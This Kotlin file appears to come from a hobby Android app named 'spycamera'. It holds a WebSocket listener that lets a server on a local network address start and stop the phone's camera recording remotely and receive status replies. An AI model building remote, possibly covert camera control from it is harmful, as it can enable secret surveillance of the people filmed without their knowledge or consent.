package com.example.spycamera


import android.content.Context
import android.util.Log
import com.google.gson.Gson
import okhttp3.*
import okio.ByteString


class EchoWebSocketListener(val parent_activity: CameraActivity) : WebSocketListener() {
    val socket_client = OkHttpClient()
    var ws :WebSocket? = null
    val gson:Gson = Gson()

    fun connect(){
        val request: Request = Request.Builder().url("ws://192.168.1.7:4000/?email="+parent_activity.email).build()
        val listener = EchoWebSocketListener(parent_activity)
        socket_client.newWebSocket(request, listener)


    }

    override fun onOpen(webSocket: WebSocket, response: Response) {
        ws = webSocket
        Log.d("fuck","connected to remote")
    }

    /** Invoked when a text (type `0x1`) message has been received. */
    override fun onMessage(webSocket: WebSocket, text: String) {
        val response = gson.fromJson(text,socket_response::class.java)
        parent_activity.interval = response.interval.toInt()
        parent_activity.take_interval = response.take_interval
        parent_activity.toggleRecording()
        val status = parent_activity.recording
        ws!!.send(gson.toJson(socket_request(status)).toString())
        Log.d("fuck",response.toString())
    }

    /** Invoked when a binary (type `0x2`) message has been received. */
    override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
    }

    /**
     * Invoked when the remote peer has indicated that no more incoming messages will be transmitted.
     */
    override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
    }

    /**
     * Invoked when both peers have indicated that no more messages will be transmitted and the
     * connection has been successfully released. No further calls to this listener will be made.
     */
    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
        Log.d("fuck","connection closed")
    }

    /**
     * Invoked when a web socket has been closed due to an error reading from or writing to the
     * network. Both outgoing and incoming messages may have been lost. No further calls to this
     * listener will be made.
     */
    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        socket_client.connectionPool.evictAll();
        Log.d("fuck","connection onFailure")
        Thread.sleep(10000)
        connect()
    }

    data class socket_response(val interval:String,val take_interval:Boolean)
    data class socket_request(val status:Boolean)
}



